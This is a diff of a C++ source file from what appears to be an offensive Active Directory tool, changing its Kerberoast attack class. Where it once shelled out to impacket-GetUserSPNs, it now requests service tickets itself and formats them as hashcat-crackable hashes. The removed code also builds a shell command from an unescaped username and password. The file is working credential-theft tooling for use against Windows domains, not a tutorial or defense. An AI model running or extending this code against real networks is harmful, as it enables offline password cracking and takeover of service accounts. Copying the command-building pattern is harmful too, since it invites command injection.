@@ -1,8 +1,9 @@
 #include <iostream>
 #include "Attacks.h"
-#include "LDAPConnection.h"
+#include "../connections/LDAPConnection.h"
 #include <string>
 #include <vector>
+#include "../connections/KerberosInteraction.h"
 
 Attacks::Kerberoast::Kerberoast(LDAPConnection& _conn) : conn(_conn) {}
 
@@ -37,18 +38,18 @@ std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN
     return kerberoastable_users;
 }
 
-bool Attacks::Kerberoast::requestTicket(const std::string& username_spn, const std::string& username, const std::string& password) {
-    std::cout << "\n[*] Requesting TGS ticket for: " << username_spn << '\n' << std::endl;
-
-    std::string output_file = username_spn + "_hash.txt";
-    std::string cmd = "impacket-GetUserSPNs yharnam.local/" + username + ":'" + password + "' -outputfile " + output_file + " -request-user " + username_spn;
-    int result = system(cmd.c_str());
-
-    if (result == 0) {
-        std::cout << "\nTicket saved in " + username_spn + "_hash.txt" << std::endl;
-        return true;
-    }  else {
-        std::cerr << "  [-] Failed to request ticket. Ensure you have a valid TGT (run 'kinit')." << std::endl;
-        return false;
+std::pair<std::string, std::string> Attacks::Kerberoast::requestTicket(
+    const std::string& username_spn, const std::string& username, 
+    bool to_file) {
+    
+    KerberosInteraction krb5;
+    std::pair<std::string, std::string> to_save;
+    std::string hashcat_ticket = krb5.requestTGS(username_spn, username);
+    if (!to_file) {
+        std::cout << hashcat_ticket << "\n\n";
+        return {"", ""};
+    } else {
+        return {username_spn, hashcat_ticket};
     }
+        
 }
